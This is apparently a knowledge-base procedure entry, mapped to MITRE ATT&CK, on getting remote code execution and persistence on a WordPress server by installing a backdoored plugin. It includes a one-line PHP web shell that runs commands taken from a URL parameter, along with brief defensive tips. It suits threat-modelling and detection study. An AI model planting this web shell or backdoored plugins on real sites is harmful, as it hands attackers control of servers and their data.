---
id: proc-install-plugin
tags:
  - rce
  - plugin
  - persistence
type: procedure
tools: []
tactics:
  - '[[Persistence]]'
commands: []
verified: false
platforms:
  - Web
  - WordPress
submitted: true
created_at: '2024-01-01T00:00:00Z'
techniques:
  - '[[Command-Line Interface]]'
  - '[[Remote File Copy]]'
updated_at: '2025-12-14T17:23:53.886Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Persistence]]'
mitre_techniques:
  - '[[Command-Line Interface]]'
  - '[[Remote File Copy]]'
---
# Install-Malicious-Plugin-for-RCE

## Summary

Automate the installation of a malicious WordPress plugin via the triggered click, leading to arbitrary code upload and execution on the server.

## Description

The click on the install button downloads and activates the malicious plugin (e.g., modified wp-super-cache with PHP backdoor), granting the attacker RCE on the WordPress server.

## Requirements

1. Malicious plugin ZIP hosted
2. WordPress upload permissions
3. Admin session active

## Defense

Defensive measures and detection strategies:

- Review plugin installs in logs
- Use security plugins like Wordfence
- Restrict file uploads

## Objectives

1. Upload plugin ZIP
2. Activate for persistence
3. Execute server-side code

## Instructions

### Step 1: Trigger Install Process

**Context**: Click initiates WordPress installer.

**Command** (WordPress Internal):
```php
// Plugin install via AJAX or form
```

> ZIP downloads. Expected output: Plugin files uploaded to /wp-content/plugins/.

### Step 2: Activate and Execute

**Context**: Post-install, plugin runs malicious code.

**Command** (Example Backdoor in Plugin):
```php
<?php system($_GET['cmd']); ?>
```

> RCE achieved. Expected output: Arbitrary commands execute on server.

## MITRE ATT&CK Mapping

### Tactics

- [[Persistence]] Persistence

### Techniques

- [[Command-Line Interface]] Command and Scripting Interpreter
- [[Remote File Copy]] Ingress Tool Transfer

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[rce]]
- [[plugin]]
